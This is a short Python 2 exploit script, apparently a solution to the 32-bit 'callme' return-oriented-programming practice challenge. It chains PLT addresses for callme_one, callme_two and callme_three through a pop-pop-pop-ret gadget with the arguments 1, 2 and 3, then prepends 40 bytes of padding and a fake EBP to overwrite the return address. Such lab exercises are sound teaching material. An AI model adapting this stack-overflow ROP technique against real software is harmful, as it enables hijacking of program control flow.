#!/usr/bin/python
from struct import pack

#+ ------------------------------------------------------------------ +
#= +----------------------------------------------------------------+ =
#= |                                                                | =
#= |     _____ ___________   _____                                  | =
#= |    /  ___/  ___| ___ \ |  __ \                                 | =
#= |    \ `--.\ `--.| |_/ / | |  \/_ __ ___  _   _ _ __             | =
#= |     `--. \`--. \ ___ \ | | __| '__/ _ \| | | | '_ \            | =
#= |    /\__/ /\__/ / |_/ / | |_\ \ | | (_) | |_| | |_) |           | =
#= |    \____/\____/\____/   \____/_|  \___/ \__,_| .__/            | =
#= |                                              | |               | =
#= |                                              |_|               | =
#= +----------------------------------------------------------------+ =
#= +----------------------------------------------------------------+ =
#= |                                                                | =
#= |                   surajsinghbisht054@gmail.com                 | =
#= |                      www.bitforestinfo.com                     | =
#= |                                                                | =
#= |                  Try Smart, Try Hard & Don't Cheat             | =
#= +----------------------------------------------------------------+ =
#+ ------------------------------------------------------------------ +


# =====================================================
#                Useful Functions Lists
# =====================================================
#
# 0x804881b <usefulFunction+15>:	call   0x80485b0 <callme_three@plt>
# 0x804882c <usefulFunction+32>:	call   0x8048620 <callme_two@plt>
# 0x804883d <usefulFunction+49>:	call   0x80485c0 <callme_one@plt>
# 0x804884a <usefulFunction+62>:	call   0x80485e0 <exit@plt>
#
# =====================================================
#               Useful Gadget
# ====================================================
# 0x080488a9 : pop esi ; pop edi ; pop ebp ; ret

# ======================================================================
#                               Crafting Payload
# ======================================================================






buf = ''
buf += pack('I', 0x80485c0) # CALLME ONE
buf += pack('I', 0x080488a9) # pop    esi	pop    edi	pop    ebp	ret   
buf += pack('I', 1)
buf += pack('I', 2)
buf += pack('I', 3)
buf += pack('I', 0x8048620) # CALLME TWO
buf += pack('I', 0x080488a9)# pop    esi	pop    edi	pop    ebp	ret 
buf += pack('I', 1)
buf += pack('I', 2)
buf += pack('I', 3)
buf += pack('I', 0x80485b0) # CALLME THREE
buf += pack('I', 0x080488a9)# pop    esi	pop    edi	pop    ebp	ret 
buf += pack('I', 1)
buf += pack('I', 2)
buf += pack('I', 3)
buf += pack('I', 0x80485e0) # EXIT

# EDX = 0
# EDI = 0
pay = ''
pay += 'A'*40 # EAX, ECX Pointing To This Text
pay += 'EEEE' # EBP
pay += buf # EIP

print pay

